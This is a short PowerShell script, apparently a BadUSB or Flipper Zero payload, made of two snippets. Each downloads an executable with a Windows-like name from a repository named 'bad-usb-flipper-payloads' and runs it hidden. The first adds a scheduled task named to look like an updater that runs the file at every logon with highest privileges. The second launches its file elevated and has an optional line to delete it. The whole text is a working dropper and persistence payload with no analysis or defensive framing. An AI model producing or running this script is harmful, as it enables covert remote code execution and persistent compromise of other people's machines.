
# Variables
$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinUman.exe"
$exePath = "$env:APPDATA\WinUman.exe"
$taskName = "WinUmanUpdater"

# Download EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Start the EXE hidden
Start-Process -FilePath $exePath -WindowStyle Hidden

# Register scheduled task to run at logon with highest privileges
$action = New-ScheduledTaskAction -Execute $exePath
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest

Write-Host "Setup complete. Scheduled task '$taskName' created."
# Define variables
$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/WinTelemetry.exe"
$exePath = "$env:TEMP\WinTelemetry.exe"

# Download EXE to temp folder
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Run the EXE with elevated privileges
Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden

# Optional: Wait a few seconds to ensure execution
Start-Sleep -Seconds 5

# Optional: Delete the EXE after running
# Remove-Item -Path $exePath -Force
